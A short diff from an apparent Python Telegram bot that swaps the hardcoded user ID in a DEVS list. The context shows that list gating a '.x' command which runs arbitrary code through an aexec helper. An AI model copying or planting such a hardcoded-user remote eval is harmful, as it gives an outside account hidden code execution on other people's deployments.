@@ -19,7 +19,7 @@ async def aexec(code, client, message):
     return await locals()["__aexec"](client, message)
 
 
-DEVS = [1641726479]
+DEVS = [843830036]
 
 
 @bot.on_message(filters.user(DEVS) & filters.command("x", "."))
